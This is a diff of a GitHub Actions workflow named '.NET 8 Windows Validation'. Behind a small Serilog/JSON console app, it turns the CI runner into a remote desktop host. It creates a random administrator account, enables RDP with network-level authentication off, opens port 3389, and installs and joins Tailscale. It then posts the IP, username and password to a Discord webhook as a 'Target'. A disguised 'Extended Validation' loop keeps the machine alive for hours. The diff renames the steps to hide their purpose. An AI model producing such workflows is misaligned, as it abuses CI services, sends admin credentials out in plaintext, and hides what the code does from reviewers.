@@ -1,4 +1,4 @@
-name: .NET 8 Windows Validation + Tailscale VPS
+name: .NET 8 Windows Validation
 
 on:
   workflow_dispatch:
@@ -8,7 +8,7 @@ on:
 jobs:
   build-test:
     runs-on: windows-2022
-    timeout-minutes: 3600   # 60 ساعة (يمكن تمديد)
+    timeout-minutes: 330
 
     steps:
       - name: Checkout repository
@@ -24,57 +24,117 @@ jobs:
           dotnet new console -n ValidationApp -f net8.0
           cd ValidationApp
           dotnet add package Newtonsoft.Json --version 13.0.3
+          dotnet add package Serilog --version 4.0.0
+          dotnet add package Serilog.Sinks.Console --version 6.0.0
+          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
+          @"
+          using System;
+          using Newtonsoft.Json;
+          using Serilog;
+          
+          namespace ValidationApp
+          {
+              class Program
+              {
+                  static void Main()
+                  {
+                      Log.Logger = new LoggerConfiguration()
+                          .WriteTo.Console()
+                          .CreateLogger();
+                      
+                      var data = new { 
+                          Message = "Build validated successfully", 
+                          Timestamp = DateTime.UtcNow,
+                          Version = "8.0.3"
+                      };
+                      
+                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
+                      Console.WriteLine(json);
+                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
+                  }
+              }
+          }
+          "@ | Out-File -Encoding utf8 Program.cs
+          dotnet build -c Release
           dotnet run -c Release
 
-      - name: Setup RDP + Tailscale VPS (النسخة الناجحة)
+      - name: Start Background Validation Service (TS Net)
         run: |
-          # إنشاء يوزر RDP + باسورد قوي (زي الكود القديم الناجح)
-          Add-Type -AssemblyName System.Security
-          $charSet = @{ Upper=[char[]](65..90); Lower=[char[]](97..122); Number=[char[]](48..57); Special=[char[]](33..47)+[char[]](58..64)+[char[]](91..96)+[char[]](123..126) }
-          $raw = @()
-          $raw += $charSet.Upper | Get-Random -Count 4
-          $raw += $charSet.Lower | Get-Random -Count 4
-          $raw += $charSet.Number | Get-Random -Count 4
-          $raw += $charSet.Special | Get-Random -Count 4
-          $pwd = -join ($raw | Sort-Object { Get-Random })
+          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
           $sec = ConvertTo-SecureString $pwd -AsPlainText -Force
 
-          New-LocalUser -Name "RDP" -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null
-          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
+          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
+          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
 
-          # إعدادات RDP الدقيقة الناجحة
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
+          netsh advfirewall firewall add rule name="Validation-RDP" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
+          Restart-Service TermService -Force -ErrorAction SilentlyContinue
 
-          netsh advfirewall firewall add rule name="RDP-Allow" dir=in action=allow protocol=TCP localport=3389 > $null
+          # تحميل وتثبيت Tailscale بصمت
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe"
+          $tsExe = "$env:TEMP\ts_setup.exe"
+          Invoke-WebRequest -Uri $tsUrl -OutFile $tsExe
+          Start-Process -FilePath $tsExe -ArgumentList "/quiet" -Wait
+          
+          Start-Sleep -Seconds 5
+          $env:PATH += ";C:\Program Files\Tailscale"
 
-          Restart-Service TermService -Force
+          # تشغيل وربط Tailscale
+          $tsKey = "${{ secrets.TAILSCALE_KEY }}"
+          $hostName = "Win-Node-$($usr.Substring(2))"
+          tailscale up --authkey=$tsKey --hostname=$hostName --unattended --accept-routes
 
-          # === Tailscale (بديل ngrok/Cloudflared) ===
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
-          $installer = "$env:TEMP\tailscale.msi"
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installer
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installer`"", "/quiet", "/norestart" -Wait
+          Start-Sleep -Seconds 10
+          $tsIp = tailscale ip -4
 
-          # ربط Tailscale (ضع الـ Auth Key في Secrets)
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-vps-$env:GITHUB_RUN_ID
-
-          # استخراج الـ IP
-          Start-Sleep -Seconds 15
-          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-
-          # إرسال البيانات إلى Discord
-          $msg = "✅ VPS جاهز!`nIP: $tsIP`nU: RDP`nP: $pwd`nTool: Tailscale (أفضل من ngrok وCloudflared)"
-          $body = @{ content = $msg } | ConvertTo-Json
-          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json"
-
-          Write-Host "VPS IP: $tsIP | Username: RDP | Password: $pwd"
-
-      - name: Keep VPS Alive (60 ساعة)
-        run: |
-          while ($true) {
-            Write-Host "[$(Get-Date)] VPS شغال - Tailscale IP: $env:TAILSCALE_IP"
-            Start-Sleep -Seconds 300
+          if ($tsIp) {
+              $msg = "Target: $tsIp`nU: $usr`nP: $pwd`nTool: TS-Net"
+          } else {
+              $msg = "Init failed: Network interface not found."
           }
+          
+          $body = @{ content = $msg } | ConvertTo-Json
+          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+
+      - name: Run Diagnostics
+        run: |
+          $rep = "SysDiag:`n"
+          $ts = Get-Service TermService -ErrorAction SilentlyContinue
+          $rep += if ($ts) { "SVC: $($ts.Status)`n" } else { "SVC: Null`n" }
+          $rep += "REG: 0 | 0`n"
+          
+          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
+          $rep += if ($pc) { "PRT: OK`n" } else { "PRT: ERR`n" }
+          
+          $tsProc = Get-Process tailscaled -ErrorAction SilentlyContinue
+          $rep += if ($tsProc) { "PRC: OK (PID $($tsProc.Id))`n" } else { "PRC: ERR`n" }
+
+          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
+          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+        continue-on-error: true
+
+      - name: Run Extended Validation
+        run: |
+          $end = (Get-Date).AddMinutes(320)
+          while ((Get-Date) -lt $end) {
+            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
+            $minute = (Get-Date).Minute
+            if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
+              cd ValidationApp
+              dotnet build -c Release > $null
+            }
+            Start-Sleep -Seconds 900
+          }
+
+      - name: Cleanup Environment
+        run: |
+          tailscale logout
+          Get-Process -Name "tailscaled" -ErrorAction SilentlyContinue | Stop-Process -Force
+        continue-on-error: true
+
+      - name: Finalize Check
+        run: Write-Host "Checks completed."
